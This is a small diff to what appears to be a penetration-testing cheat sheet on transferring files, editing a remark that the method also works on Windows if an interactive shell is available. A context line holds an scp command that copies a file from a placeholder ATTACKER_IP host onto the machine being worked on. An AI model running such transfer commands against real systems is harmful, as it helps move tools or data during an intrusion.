@@ -74,7 +74,7 @@ or the other way:
 scp ${USER}@${ATTACKER_IP}:/full/path/to/file path/to/dest
 ```
 
-Works on modern windows boxes too.
+Works on modern windows boxes too, but requires proper interactive shell to work.
 
 
 
